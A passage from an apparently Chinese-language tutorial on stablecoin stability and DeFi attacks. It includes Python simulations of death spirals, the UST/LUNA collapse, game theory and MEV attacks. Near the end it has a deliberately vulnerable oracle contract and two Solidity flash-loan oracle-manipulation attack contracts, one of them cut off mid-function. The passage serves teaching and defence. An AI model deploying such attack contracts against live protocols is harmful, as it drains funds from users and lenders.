            for j, defense in enumerate(defenses):
                for i, attack in enumerate(attacks):
                    payoffs[j] += attacker_strat[i] * \
                                 self.payoff_matrix[attack][defense][1]
        
        return payoffs
    
    def plot_evolutionary_dynamics(self, history):
        """绘制演化动态"""
        fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(14, 6))
        
        # 攻击者策略演化
        attacker_history = np.array(history['attacker'])
        ax1.plot(attacker_history[:, 0], label='价格操纵', linewidth=2)
        ax1.plot(attacker_history[:, 1], label='闪电贷', linewidth=2)
        ax1.plot(attacker_history[:, 2], label='治理攻击', linewidth=2)
        ax1.set_xlabel('迭代次数')
        ax1.set_ylabel('策略比例')
        ax1.set_title('攻击者策略演化')
        ax1.legend()
        ax1.grid(True, alpha=0.3)
        
        # 防御者策略演化
        defender_history = np.array(history['defender'])
        ax2.plot(defender_history[:, 0], label='被动防御', linewidth=2)
        ax2.plot(defender_history[:, 1], label='主动监控', linewidth=2)
        ax2.plot(defender_history[:, 2], label='动态调整', linewidth=2)
        ax2.set_xlabel('迭代次数')
        ax2.set_ylabel('策略比例')
        ax2.set_title('防御者策略演化')
        ax2.legend()
        ax2.grid(True, alpha=0.3)
        
        plt.tight_layout()
        return fig

# 运行博弈分析
game = StablecoinGameTheory()
mixed_strategy = game.calculate_mixed_strategy_nash()
print(f"攻击者混合策略纳什均衡: {mixed_strategy}")

# 模拟演化动态
history = game.simulate_evolutionary_dynamics()
fig = game.plot_evolutionary_dynamics(history)</code></pre>
                </div>
            </div>
            
            <h5>5. 死亡螺旋的数学形式化</h5>
            <p>死亡螺旋不仅是一个定性概念，更可以通过差分方程系统严格建模。我们定义状态转移方程来捕获价格、储备和供应量之间的动态关系：</p>
            
            <div class="math-formula">
                <p><strong>状态方程：</strong></p>
                <ul>
                    <li>P<sub>t</sub> = α · R<sub>t-1</sub> / S<sub>t-1</sub> + β · E[P<sub>t+1</sub>] - γ · (S<sub>t</sub> - S<sub>t-1</sub>)</li>
                    <li>S<sub>t</sub> = S<sub>t-1</sub> + μ · (1 - P<sub>t</sub>) · S<sub>t-1</sub></li>
                    <li>R<sub>t</sub> = R<sub>t-1</sub> - ρ · (1 - P<sub>t</sub>) · S<sub>t-1</sub></li>
                </ul>
                <p>其中：P<sub>t</sub> = 治理代币价格，R<sub>t</sub> = 储备金，S<sub>t</sub> = 稳定币供应量</p>
                <p>参数：α = 基本面权重，β = 预期权重，γ = 供应冲击系数，μ = 铸币率，ρ = 赎回率</p>
            </div>
            
            <h5>5. Lyapunov稳定性分析</h5>
            <p>为了分析系统的稳定性，我们使用Lyapunov函数方法：</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># 死亡螺旋的严格数学建模与稳定性分析
import numpy as np
from scipy.optimize import fsolve
from scipy.linalg import eigvals
import matplotlib.pyplot as plt

class StablecoinStabilityAnalysis:
    """稳定币系统的稳定性分析框架"""
    
    def __init__(self, params: dict):
        self.alpha = params['alpha']  # 基本面权重
        self.beta = params['beta']    # 预期权重
        self.gamma = params['gamma']  # 供应冲击系数
        self.mu = params['mu']        # 铸币率
        self.rho = params['rho']      # 赎回率
        
    def state_transition(self, state: np.ndarray, expectation: float) -> np.ndarray:
        """
        状态转移函数
        state = [P_t, S_t, R_t]
        """
        P, S, R = state
        
        # 价格动态（包含反身性）
        P_next = self.alpha * R / S + self.beta * expectation - self.gamma * self.mu * (1 - P) * S
        
        # 供应动态
        S_next = S + self.mu * (1 - P) * S
        
        # 储备动态
        R_next = R - self.rho * (1 - P) * S
        
        return np.array([P_next, S_next, R_next])
    
    def find_equilibrium(self, initial_guess: np.ndarray) -> np.ndarray:
        """寻找系统平衡点"""
        def equilibrium_condition(state):
            P, S, R = state
            next_state = self.state_transition(state, P)  # 理性预期：E[P_t+1] = P_t
            return next_state - state
        
        equilibrium = fsolve(equilibrium_condition, initial_guess)
        return equilibrium
    
    def linearize_around_equilibrium(self, equilibrium: np.ndarray) -> np.ndarray:
        """在平衡点附近线性化，计算雅可比矩阵"""
        P_eq, S_eq, R_eq = equilibrium
        
        # 雅可比矩阵
        J = np.array([
            [self.beta - self.gamma * self.mu * S_eq, 
             -self.alpha * R_eq / S_eq**2 - self.gamma * self.mu * (1 - P_eq),
             self.alpha / S_eq],
            [self.mu * S_eq, 
             self.mu * (1 - P_eq), 
             0],
            [-self.rho * S_eq, 
             -self.rho * (1 - P_eq), 
             1]
        ])
        
        return J
    
    def check_lyapunov_stability(self, equilibrium: np.ndarray) -> dict:
        """使用Lyapunov方法检查稳定性"""
        J = self.linearize_around_equilibrium(equilibrium)
        eigenvalues = eigvals(J)
        
        # 定义Lyapunov函数 V(x) = x^T P x
        # 其中P是正定矩阵，满足Lyapunov方程：J^T P + P J = -Q
        
        stability_results = {
            'eigenvalues': eigenvalues,
            'max_real_part': np.max(np.real(eigenvalues)),
            'is_stable': np.all(np.real(eigenvalues) < 0),
            'stability_margin': -np.max(np.real(eigenvalues)) if np.all(np.real(eigenvalues) < 0) else 0
        }
        
        return stability_results
    
    def simulate_death_spiral(self, initial_state: np.ndarray, 
                            shock_magnitude: float, 
                            time_steps: int = 100) -> dict:
        """模拟死亡螺旋过程"""
        states = np.zeros((time_steps, 3))
        states[0] = initial_state
        
        # 施加初始冲击
        states[0, 0] *= (1 - shock_magnitude)  # 价格冲击
        
        # 预期形成机制（自适应预期）
        expectations = np.zeros(time_steps)
        expectations[0] = states[0, 0]
        
        for t in range(1, time_steps):
            # 更新预期（加权平均）
            expectations[t] = 0.7 * states[t-1, 0] + 0.3 * expectations[t-1]
            
            # 状态转移
            states[t] = self.state_transition(states[t-1], expectations[t])
            
            # 检查崩溃条件
            if states[t, 0] < 0.1 or states[t, 2] < 0:  # 价格接近0或储备耗尽
                states[t:] = states[t]  # 系统崩溃，状态不再变化
                break
        
        return {
            'states': states,
            'expectations': expectations,
            'collapse_time': t if t < time_steps - 1 else None
        }

# 参数校准（基于历史数据）
params = {
    'alpha': 0.6,   # 基本面权重
    'beta': 0.3,    # 预期权重
    'gamma': 0.05,  # 供应冲击系数
    'mu': 0.1,      # 铸币率
    'rho': 0.15     # 赎回率
}

# 创建分析实例
analyzer = StablecoinStabilityAnalysis(params)

# 寻找平衡点
equilibrium = analyzer.find_equilibrium([1.0, 1000, 1000])
print(f"系统平衡点: P={equilibrium[0]:.3f}, S={equilibrium[1]:.0f}, R={equilibrium[2]:.0f}")

# 稳定性分析
stability = analyzer.check_lyapunov_stability(equilibrium)
print(f"系统稳定性: {'稳定' if stability['is_stable'] else '不稳定'}")
print(f"稳定性裕度: {stability['stability_margin']:.4f}")

# 模拟20%价格冲击
simulation = analyzer.simulate_death_spiral(equilibrium, shock_magnitude=0.2)
if simulation['collapse_time']:
    print(f"系统在第{simulation['collapse_time']}期崩溃")</code></pre>
                </div>
            </div>
            
            <h5>6. UST/LUNA死亡螺旋案例的定量分析</h5>
            <p>基于上述理论框架，我们可以精确重现Terra生态系统的崩溃过程：</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># UST/LUNA死亡螺旋量化模型
import numpy as np
import matplotlib.pyplot as plt
from typing import Tuple, List

class DeathSpiralModel:
    """
    模拟UST/LUNA式的算法稳定币死亡螺旋
    """
    def __init__(self, initial_params: dict):
        self.ust_supply = initial_params['ust_supply']  # UST总供应
        self.luna_price = initial_params['luna_price']  # LUNA初始价格
        self.luna_supply = initial_params['luna_supply']  # LUNA总供应
        self.market_liquidity = initial_params['market_liquidity']  # 市场流动性
        self.panic_threshold = initial_params['panic_threshold']  # 恐慌阈值
        
    def calculate_luna_mint_amount(self, ust_burn: float, ust_price: float) -> float:
        """
        计算燃烧UST后铸造的LUNA数量
        公式: LUNA_minted = UST_burned / (UST_price * LUNA_price)
        """
        return ust_burn / (ust_price * self.luna_price)
    
    def calculate_price_impact(self, luna_sold: float) -> float:
        """
        计算大量抛售LUNA对价格的影响
        使用幂函数模型: Impact = (luna_sold / liquidity) ^ 2
        """
        liquidity_ratio = luna_sold / self.market_liquidity
        return liquidity_ratio ** 2
    
    def simulate_death_spiral(
        self, 
        initial_depeg: float,
        arbitrageur_capital: float,
        time_steps: int = 100
    ) -> Tuple[List[float], List[float], List[float]]:
        """
        模拟完整的死亡螺旋过程
        """
        ust_prices = [1 - initial_depeg]
        luna_prices = [self.luna_price]
        luna_supplies = [self.luna_supply]
        
        for t in range(time_steps):
            current_ust_price = ust_prices[-1]
            
            # 套利者利用脱钅机会
            if current_ust_price < 0.99:  # UST价格低于0.99美元
                # 计算套利金额
                arbitrage_amount = min(
                    arbitrageur_capital * (0.99 - current_ust_price),
                    self.ust_supply * 0.01  # 每次最多套利总供应的1%
                )
                
                # 燃烧UST，铸造LUNA
                luna_minted = self.calculate_luna_mint_amount(
                    arbitrage_amount, 
                    current_ust_price
                )
                self.luna_supply += luna_minted
                self.ust_supply -= arbitrage_amount
                
                # 套利者在市场上抛售LUNA
                price_impact = self.calculate_price_impact(luna_minted)
                self.luna_price *= (1 - price_impact)
                
                # LUNA价格下跌引发更多恐慌
                if self.luna_price < self.panic_threshold:
                    # 恐慌性抛售加剧
                    panic_selling = self.luna_supply * 0.05  # 5%的持有者恐慌抛售
                    additional_impact = self.calculate_price_impact(panic_selling)
                    self.luna_price *= (1 - additional_impact)
                
                # UST脱钅加剧（由于LUNA价值下跌，背书不足）
                luna_market_cap = self.luna_price * self.luna_supply
                backing_ratio = luna_market_cap / self.ust_supply
                
                # 新的UST价格取决于背书比率
                new_ust_price = min(0.99, backing_ratio * 0.95)  # 假设5场对背书有一定信心
                
            else:
                new_ust_price = min(1.0, current_ust_price + 0.001)  # 缓慢恢复
            
            ust_prices.append(new_ust_price)
            luna_prices.append(self.luna_price)
            luna_supplies.append(self.luna_supply)
            
            # 终止条件：LUNA价格归零或UST完全崩溃
            if self.luna_price < 0.01 or new_ust_price < 0.1:
                print(f"\u6b7b亡螺旋完成，系统在第{t}步崩溃")
                break
        
        return ust_prices, luna_prices, luna_supplies
    
    def analyze_critical_points(self) -> dict:
        """
        分析系统的关键参数和临界点
        """
        # 最小可持续背书比率
        min_backing_ratio = 1.5  # 假设需要150%的超额抵押
        
        # 最大可承受的脱钅幅度
        max_depeg = 0.05  # 5%
        
        # 触发死亡螺旋的LUNA价格阈值
        critical_luna_price = (self.ust_supply * min_backing_ratio) / self.luna_supply
        
        return {
            'min_backing_ratio': min_backing_ratio,
            'max_sustainable_depeg': max_depeg,
            'critical_luna_price': critical_luna_price,
            'current_backing_ratio': (self.luna_price * self.luna_supply) / self.ust_supply
        }

# 使用示例
params = {
    'ust_supply': 18_000_000_000,   # 180亿 UST
    'luna_price': 80,                # LUNA初始价格80美元
    'luna_supply': 350_000_000,      # 3.5亿 LUNA
    'market_liquidity': 500_000_000, # 5亿美元流动性
    'panic_threshold': 50            # 价格低于50美元时触发恐慌
}

model = DeathSpiralModel(params)
critical_points = model.analyze_critical_points()

print(f"关键参数分析:")
print(f"当前背书比率: {critical_points['current_backing_ratio']:.2f}")
print(f"触发死亡螺旋的LUNA价格: ${critical_points['critical_luna_price']:.2f}")

# 模拟10%脱钅情况
ust_prices, luna_prices, luna_supplies = model.simulate_death_spiral(
    initial_depeg=0.10,      # 10%脱钅
    arbitrageur_capital=1_000_000_000,  # 10亿美元套利资金
    time_steps=50
)

# 可视化结果
fig, (ax1, ax2, ax3) = plt.subplots(3, 1, figsize=(10, 12))

# UST价格
ax1.plot(ust_prices, 'b-', linewidth=2)
ax1.axhline(y=1, color='r', linestyle='--', label='锚定价格')
ax1.set_ylabel('UST 价格 (USD)')
ax1.set_title('UST 脱锚过程')
ax1.grid(True, alpha=0.3)
ax1.legend()

# LUNA价格
ax2.plot(luna_prices, 'g-', linewidth=2)
ax2.set_ylabel('LUNA 价格 (USD)')
ax2.set_title('LUNA 价格崩溃')
ax2.grid(True, alpha=0.3)

# LUNA供应量
ax3.plot(luna_supplies, 'orange', linewidth=2)
ax3.set_ylabel('LUNA 供应量')
ax3.set_xlabel('时间步')
ax3.set_title('LUNA 供应量膨胀')
ax3.grid(True, alpha=0.3)

plt.tight_layout()
plt.show()</code></pre>
                </div>
            </div>
        </div>

        <h4>10.1.2 博弈论分析</h4>
        
        <div class="theory-section">
            <p>稳定币系统中的经济行为可以用博弈论模型来分析：</p>
            
            <div class="code-block">
                <div class="code-header">
                    Python 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># 稳定币博弈论模型
import numpy as np
from scipy.optimize import minimize
from typing import List, Tuple

class StablecoinGameTheory:
    def __init__(self):
        self.players = ['holder', 'arbitrageur', 'attacker', 'protocol']
    
    def calculate_nash_equilibrium(
        self,
        payoff_matrix: np.ndarray
    ) -> Tuple[np.ndarray, np.ndarray]:
        """计算纳什均衡"""
        n_strategies = payoff_matrix.shape[0]
        
        # 设置线性规划问题
        c = np.zeros(n_strategies + 1)
        c[-1] = -1  # 最大化期望收益
        
        # 约束条件
        A_ub = np.column_stack((-payoff_matrix.T, np.ones(n_strategies)))
        b_ub = np.zeros(n_strategies)
        
        A_eq = np.zeros((1, n_strategies + 1))
        A_eq[0, :n_strategies] = 1
        b_eq = np.array([1])
        
        bounds = [(0, 1) for _ in range(n_strategies)] + [(None, None)]
        
        # 求解
        result = minimize(
            lambda x: -x[-1],
            x0=np.ones(n_strategies + 1) / n_strategies,
            method='SLSQP',
            bounds=bounds,
            constraints=[
                {'type': 'ineq', 'fun': lambda x: A_ub @ x - b_ub},
                {'type': 'eq', 'fun': lambda x: A_eq @ x - b_eq}
            ]
        )
        
        strategy = result.x[:n_strategies]
        value = -result.fun
        
        return strategy, value
    
    def bank_run_game(
        self,
        reserve_ratio: float,
        n_depositors: int,
        stablecoin_params: dict = None
    ) -> Dict[str, float]:
        """
        增强的Diamond-Dybvig模型，融入稳定币特定参数
        
        参数映射:
        - R (长期投资回报) -> staking_yield (质押收益率)
        - L (短期取款惩罚) -> redemption_fee (赎回费用)
        - p (恐慌概率) -> 基于链上指标计算
        """
        
        # 默认参数
        if stablecoin_params is None:
            stablecoin_params = {
                'staking_yield': 0.05,      # 5% APY
                'redemption_fee': 0.003,    # 0.3% 赎回费
                'collateral_ratio': 1.5,    # 150% 抵押率
                'liquidation_penalty': 0.13  # 13% 清算罚金
            }
        
        # 从稳定币参数计算博弈参数
        early_withdrawal_penalty = stablecoin_params['redemption_fee']
        late_withdrawal_bonus = stablecoin_params['staking_yield'] / 12  # 按月计
        
        # 计算临界点
        # 如果提取的人数超过临界点，银行破产
        critical_withdrawals = int(reserve_ratio * n_depositors)
        
        results = {}
        
        # 模拟不同提取比例下的收益
        for withdraw_ratio in np.linspace(0, 1, 21):
            n_withdraw = int(withdraw_ratio * n_depositors)
            
            if n_withdraw <= critical_withdrawals:
                # 银行存活
                payoff_withdraw = 1 - early_withdrawal_penalty
                payoff_stay = 1 + late_withdrawal_bonus
            else:
                # 银行破产
                # 早期提取者按比例获得储备
                payoff_withdraw = reserve_ratio / withdraw_ratio if withdraw_ratio > 0 else 0
                # 留存者损失全部
                payoff_stay = 0
            
            # 期望收益
            expected_payoff = (
                withdraw_ratio * payoff_withdraw + 
                (1 - withdraw_ratio) * payoff_stay
            )
            
            results[f"{withdraw_ratio:.0%}_withdraw"] = {
                'withdraw_payoff': payoff_withdraw,
                'stay_payoff': payoff_stay,
                'expected_payoff': expected_payoff,
                'is_bank_run': n_withdraw > critical_withdrawals
            }
        
        return results
    
    def calculate_attack_defense_equilibrium(
        self,
        attack_cost: float,
        defense_cost: float,
        system_value: float,
        attack_success_rate: float
    ) -> Dict[str, float]:
        """攻防博弈均衡分析"""
        
        # 收益矩阵
        # 行：攻击者策略（攻击/不攻击）
        # 列：防御者策略（防御/不防御）
        payoff_attacker = np.array([
            [
                attack_success_rate * system_value - attack_cost,  # 攻击vs防御
                system_value - attack_cost                         # 攻击vs不防御
            ],
            [0, 0]  # 不攻击
        ])
        
        payoff_defender = np.array([
            [
                -defense_cost,                                      # 防御vs攻击
                -system_value                                       # 不防御vs攻击
            ],
            [-defense_cost, 0]  # vs不攻击
        ])
        
        # 混合策略纳什均衡
        # p = 防御概率，q = 攻击概率
        p_defend = attack_cost / (system_value * (1 - attack_success_rate))
        q_attack = defense_cost / (system_value * (1 - attack_success_rate))
        
        # 确保概率在[0,1]范围内
        p_defend = np.clip(p_defend, 0, 1)
        q_attack = np.clip(q_attack, 0, 1)
        
        return {
            'defense_probability': p_defend,
            'attack_probability': q_attack,
            'expected_loss': q_attack * (1 - p_defend) * system_value,
            'defense_efficiency': 1 - (q_attack * (1 - p_defend))
        }

# 使用示例
game = StablecoinGameTheory()

# 分析银行挤兑
bank_run_results = game.bank_run_game(
    reserve_ratio=0.2,  # 20%准备金率
    n_depositors=1000   # 1000个存款人
)

# 找出均衡点
for ratio, result in bank_run_results.items():
    if result['is_bank_run']:
        print(f"Bank run triggered at {ratio}")
        break

# 攻防博弈分析
equilibrium = game.calculate_attack_defense_equilibrium(
    attack_cost=100_000,
    defense_cost=50_000,
    system_value=10_000_000,
    attack_success_rate=0.3
)

print(f"最优防御概率: {equilibrium['defense_probability']:.2%}")
print(f"预期攻击概率: {equilibrium['attack_probability']:.2%}")</code></pre>
                </div>
            </div>
        </div>

        <h3 id="defi-specific-attacks">10.2 DeFi特定攻击手段</h3>
        
        <div class="theory-section">
            <h4>10.2.0 2024年MEV演进与新型攻击向量</h4>
            
            <h5>MEV-Boost与PBS架构</h5>
            <p>以太坊合并后，MEV提取进入了新阶段。<strong>Proposer-Builder Separation (PBS)</strong>架构将区块构建和提议分离，带来新的攻击向量：</p>
            
            <div class="info-box">
                <h6>PBS架构下的攻击升级</h6>
                <ul>
                    <li><strong>Builder贿赂攻击</strong>：攻击者通过贿赂Builder保证恶意Bundle被打包</li>
                    <li><strong>时间强盗攻击 (Time-bandit attacks)</strong>：区块生产者为捕获过去的MEV而重组链</li>
                    <li><strong>跨域MEV</strong>：利用L1-L2或跨链桥的时间差进行套利</li>
                    <li><strong>隐私MEV</strong>：通过私有内存池逃避检测</li>
                </ul>
            </div>
            
            <h5>Intent-Based架构：从MEV防护到新型风险</h5>
            <p>Intent-based系统（如SUAVE、CowSwap）通过将用户"意图"外包给专业求解器来消除某些MEV攻击，但也引入新风险：</p>
            
            <ul>
                <li><strong>求解器串谋</strong>：多个求解器合作操纵价格</li>
                <li><strong>意图泄露</strong>：用户意图在执行前被窃取</li>
                <li><strong>执行质量攻击</strong>：故意提供次优执行路径</li>
            </ul>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>▶ Python: MEV-Boost架构下的攻击模拟</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
from typing import List, Dict, Tuple
import hashlib

class MEVBoostSimulator:
    """模拟MEV-Boost架构下的攻击策略"""
    
    def __init__(self):
        self.builders = {}
        self.relays = {}
        self.proposers = {}
        
    def simulate_builder_auction(self, 
                               transactions: List[Dict],
                               builder_strategies: Dict) -> Dict:
        """模拟Builder拍卖过程"""
        bundles = {}
        
        for builder_id, strategy in builder_strategies.items():
            # 每个Builder构建自己的Bundle
            bundle = self.construct_bundle(transactions, strategy)
            
            # 计算Bundle价值（包括MEV）
            bundle_value = self.calculate_bundle_value(bundle)
            
            # Builder出价（考虑利润保留）
            bid = bundle_value * (1 - strategy['profit_margin'])
            
            bundles[builder_id] = {
                'bundle': bundle,
                'bid': bid,
                'mev_extracted': bundle_value - sum(tx['gas'] for tx in bundle)
            }
        
        # 选择最高出价的Bundle
        winning_builder = max(bundles.keys(), key=lambda b: bundles[b]['bid'])
        
        return {
            'winner': winning_builder,
            'winning_bundle': bundles[winning_builder],
            'all_bids': {b: bundles[b]['bid'] for b in bundles}
        }
    
    def simulate_time_bandit_attack(self,
                                  block_history: List[Dict],
                                  reorg_depth: int) -> Dict:
        """模拟时间强盗攻击"""
        
        # 计算重组收益
        reorg_profit = 0
        original_mev = 0
        
        for i in range(reorg_depth):
            block = block_history[-(i+1)]
            # 识别可提取的MEV
            extractable_mev = self.identify_mev_opportunities(block)
            reorg_profit += extractable_mev
            original_mev += block.get('mev_extracted', 0)
        
        # 计算重组成本
        reorg_cost = self.calculate_reorg_cost(reorg_depth)
        
        # 攻击决策
        attack_profitable = reorg_profit > (original_mev + reorg_cost)
        
        return {
            'profitable': attack_profitable,
            'potential_profit': reorg_profit - original_mev - reorg_cost,
            'reorg_depth': reorg_depth,
            'mev_captured': reorg_profit
        }
    
    def identify_mev_opportunities(self, block: Dict) -> float:
        """识别区块中的MEV机会"""
        mev = 0
        
        # 套利机会
        for tx in block['transactions']:
            if tx['type'] == 'swap':
                # 检查价格差异
                price_diff = abs(tx['execution_price'] - tx['market_price'])
                mev += price_diff * tx['amount'] * 0.8  # 80%可捕获
        
        # 清算机会
        liquidations = [tx for tx in block['transactions'] 
                       if tx['type'] == 'liquidation']
        mev += sum(liq['penalty'] * 0.5 for liq in liquidations)
        
        return mev

# Intent-based系统攻击模拟
class IntentBasedAttackSimulator:
    """模拟Intent-based架构下的攻击"""
    
    def __init__(self):
        self.solvers = {}
        self.intent_pool = []
        
    def simulate_solver_collusion(self,
                                intents: List[Dict],
                                honest_solvers: int,
                                colluding_solvers: int) -> Dict:
        """模拟求解器串谋攻击"""
        
        # 正常竞争情况下的执行质量
        competitive_quality = self.calculate_competitive_execution(
            intents, honest_solvers + colluding_solvers
        )
        
        # 串谋情况下的执行质量
        collusion_quality = self.calculate_collusion_execution(
            intents, colluding_solvers, honest_solvers
        )
        
        # 用户损失
        user_loss = competitive_quality['user_surplus'] - \
                   collusion_quality['user_surplus']
        
        # 串谋者额外收益
        collusion_profit = collusion_quality['solver_profit'] - \
                          competitive_quality['solver_profit']
        
        return {
            'user_loss_per_trade': user_loss / len(intents),
            'collusion_profit_per_solver': collusion_profit / colluding_solvers,
            'execution_quality_degradation': 
                (competitive_quality['execution_score'] - 
                 collusion_quality['execution_score']) / 
                competitive_quality['execution_score'],
            'detection_difficulty': self.calculate_detection_difficulty(
                colluding_solvers, honest_solvers
            )
        }
    
    def simulate_intent_privacy_attack(self,
                                     intent: Dict,
                                     market_impact_model: callable) -> Dict:
        """模拟意图隐私攻击"""
        
        # 正常执行
        normal_execution = {
            'price': intent['expected_price'],
            'slippage': intent['max_slippage']
        }
        
        # 攻击者提前知道意图后的操作
        # 1. 提前买入
        frontrun_amount = intent['amount'] * 0.3  # 攻击者资金限制
        price_impact = market_impact_model(frontrun_amount)
        
        # 2. 用户执行（价格已被推高）
        user_execution_price = intent['expected_price'] * (1 + price_impact)
        
        # 3. 攻击者卖出获利
        attacker_profit = frontrun_amount * price_impact * 0.7  # 扣除成本
        
        return {
            'user_additional_cost': (user_execution_price - normal_execution['price']) * intent['amount'],
            'attacker_profit': attacker_profit,
            'price_impact': price_impact,
            'detection_signals': [
                'unusual_volume_before_large_trade',
                'correlated_trades_across_venues',
                'timing_analysis_anomaly'
            ]
        }

# 使用示例
mev_sim = MEVBoostSimulator()

# 模拟Builder拍卖
transactions = [
    {'type': 'swap', 'amount': 1000000, 'gas': 200000, 'execution_price': 1.01, 'market_price': 1.0},
    {'type': 'liquidation', 'penalty': 50000, 'gas': 300000},
    # ... 更多交易
]

builder_strategies = {
    'builder_1': {'profit_margin': 0.1, 'specialization': 'arbitrage'},
    'builder_2': {'profit_margin': 0.05, 'specialization': 'liquidations'},
    'builder_3': {'profit_margin': 0.15, 'specialization': 'general'}
}

auction_result = mev_sim.simulate_builder_auction(transactions, builder_strategies)
print(f"获胜Builder: {auction_result['winner']}")
print(f"MEV提取: ${auction_result['winning_bundle']['mev_extracted']:,.2f}")</code></pre>
                </div>
            </div>
            
            <h5>再质押风险（Restaking Risk）与LRT攻击</h5>
            <p>2024年最重要的新兴风险领域。流动性再质押代币（LRTs）引入多层风险叠加：</p>
            
            <div class="warning-box">
                <h6>LRT作为稳定币抵押品的风险</h6>
                <ul>
                    <li><strong>基础层风险</strong>：底层ETH质押的罚没风险</li>
                    <li><strong>AVS风险</strong>：EigenLayer主动验证服务的特定风险</li>
                    <li><strong>协议风险</strong>：LRT协议本身的智能合约风险</li>
                    <li><strong>流动性风险</strong>：LRT/ETH脱锚风险</li>
                </ul>
                
                <p><strong>攻击向量</strong>：攻击者可通过攻击某个AVS触发大规模罚没，导致LRT价值暴跌，进而触发使用LRT作为抵押品的稳定币系统连环清算。</p>
            </div>
        </div>
        
        <div class="practice-section">
            <h4>10.2.1 闪电贷攻击进阶</h4>
            
            <div class="warning-box">
                <p><strong>闪电贷的本质</strong>：闪电贷本身不是漏洞，而是"原子性"的资本放大器。核心问题是它利用了"检查-生效"竞争条件（Check-Effect Race Condition），尤其是在预言机更新机制上。</p>
            </div>
            
            <h5>实践示例：有漏洞的预言机合约</h5>
            <div class="code-block">
                <div class="code-header">
                    Solidity 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// 有漏洞的预言机合约（仅供教学使用）
contract VulnerableOracle {
    address public priceSource;  // 单一DEX作为价格源
    uint256 public lastPrice;
    uint256 public lastUpdateTime;
    
    constructor(address _priceSource) {
        priceSource = _priceSource;
    }
    
    // 漏洞：使用单一DEX的现货价格
    function updatePrice(address token0, address token1) external {
        IUniswapV2Pair pair = IUniswapV2Pair(priceSource);
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        
        // 直接使用当前储备量计算价格
        if (pair.token0() == token0) {
            lastPrice = (uint256(reserve1) * 1e18) / uint256(reserve0);
        } else {
            lastPrice = (uint256(reserve0) * 1e18) / uint256(reserve1);
        }
        
        lastUpdateTime = block.timestamp;
    }
    
    function getPrice() external view returns (uint256) {
        require(block.timestamp - lastUpdateTime < 3600, "Price too old");
        return lastPrice;
    }
}

// 攻击合约
contract OracleManipulationAttack {
    IFlashLoanProvider constant AAVE = IFlashLoanProvider(0x...);
    IUniswapV2Router constant ROUTER = IUniswapV2Router(0x...);
    VulnerableOracle constant ORACLE = VulnerableOracle(0x...);
    IVulnerableProtocol constant TARGET = IVulnerableProtocol(0x...);
    
    function executeAttack() external {
        // 步骤1: 借入1000万USDC
        uint256 loanAmount = 10_000_000 * 1e6;
        AAVE.flashLoan(address(this), address(USDC), loanAmount, "");
    }
    
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // 步骤2: 在作为价格源的DEX上大量买入目标代币
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(TARGET_TOKEN);
        
        // 使用5百万USDC买入，大幅推高价格
        uint256 manipulationAmount = 5_000_000 * 1e6;
        USDC.approve(address(ROUTER), manipulationAmount);
        
        uint256[] memory amounts = ROUTER.swapExactTokensForTokens(
            manipulationAmount,
            0,  // 接受任何数量的输出
            path,
            address(this),
            block.timestamp
        );
        
        uint256 tokenReceived = amounts[1];
        
        // 步骤3: 触发预言机更新
        ORACLE.updatePrice(address(USDC), address(TARGET_TOKEN));
        
        // 步骤4: 利用被操纵的价格
        // 例如：以虚高价格作为抵押品借出更多资金
        TARGET_TOKEN.approve(address(TARGET), tokenReceived);
        TARGET.deposit(tokenReceived);
        
        // 借出最大可能的USDC（基于被操纵的高价格）
        uint256 borrowAmount = TARGET.calculateMaxBorrow(address(this));
        TARGET.borrow(address(USDC), borrowAmount);
        
        // 步骤5: 在DEX上卖回，恢复价格
        path[0] = address(TARGET_TOKEN);
        path[1] = address(USDC);
        
        TARGET_TOKEN.approve(address(ROUTER), tokenReceived);
        ROUTER.swapExactTokensForTokens(
            tokenReceived,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        // 步骤6: 偿还闪电贷
        uint256 totalDebt = amount + premium;
        USDC.approve(address(AAVE), totalDebt);
        
        // 利润 = 借出的额外USDC - 闪电贷费用 - 交易损耗
        uint256 profit = USDC.balanceOf(address(this)) - totalDebt;
        
        return true;
    }
}</code></pre>
                </div>
            </div>
            
            <div class="code-block">
                <div class="code-header">
                    Solidity 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// 复杂闪电贷攻击示例
contract FlashLoanAttackVector {
    
    // 攻击案例：利用闪电贷操纵预言机价格
    function executeOracleManipulation(
        address flashLoanProvider,
        address targetToken,
        address stablecoin,
        uint256 loanAmount
    ) external {
        // 步骤1：借入大量资金
        IFlashLoanProvider(flashLoanProvider).flashLoan(
            loanAmount,
            abi.encode(targetToken, stablecoin)
        );
    }
    
    function onFlashLoanReceived(
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external {
        (address targetToken, address stablecoin) = abi.decode(
            data, 
            (address, address)
        );
        
        // 步骤2：使用借来的资金操纵价格
        // 在低流动性池中大量买入，推高价格
        IUniswapV2Router(ROUTER).swapExactTokensForTokens(
            amount / 2,
            0,
            getPath(stablecoin, targetToken),
            address(this),
            block.timestamp
        );
        
        // 步骤3：利用被操纵的价格
        // 例如：以虚高价格作为抵押品借出更多资金
        ILendingProtocol(LENDING).deposit(targetToken, myBalance);
        uint256 borrowAmount = ILendingProtocol(LENDING).borrow(
            stablecoin,
            calculateMaxBorrow() // 基于被操纵的价格
        );
        
        // 步骤4：平仓并获利
        // 卖出之前买入的代币，价格回落
        IUniswapV2Router(ROUTER).swapExactTokensForTokens(
            targetBalance,
            0,
            getPath(targetToken, stablecoin),
            address(this),
            block.timestamp
        );
        
        // 步骤5：偿还闪电贷
        IERC20(stablecoin).transfer(
            flashLoanProvider,
            amount + fee
        );
        
